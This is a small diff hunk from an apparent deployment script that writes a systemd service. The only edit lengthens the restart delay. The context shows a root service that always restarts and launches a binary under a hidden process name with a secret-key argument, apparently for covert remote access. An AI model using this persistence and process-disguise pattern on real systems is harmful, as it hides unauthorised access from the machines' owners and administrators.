@@ -1140,7 +1140,7 @@ After=network.target
 [Service]
 Type=simple
 Restart=always
-RestartSec=10
+RestartSec=300
 WorkingDirectory=/root
 ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
 
